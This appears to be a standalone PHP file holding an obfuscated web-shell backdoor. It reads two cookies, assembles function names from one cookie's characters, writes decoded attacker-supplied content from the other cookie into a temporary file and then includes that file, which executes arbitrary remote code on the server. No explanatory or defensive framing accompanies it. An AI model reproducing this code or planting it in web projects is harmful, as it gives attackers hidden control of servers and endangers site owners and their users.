<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[12])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 3;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[12][$n];
        if (!$c[12][$n + 1]) {
            if (!$c[12][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 3 + 1;
    }
    $k = $p[22]() . $p[14];
    if (!$p[19]($k)) {
        $n = $p[17]($k, $p[2]);
        $p[11]($n, $p[0] . $p[29]($p[21]($c[3])));
    }
    include($k);
}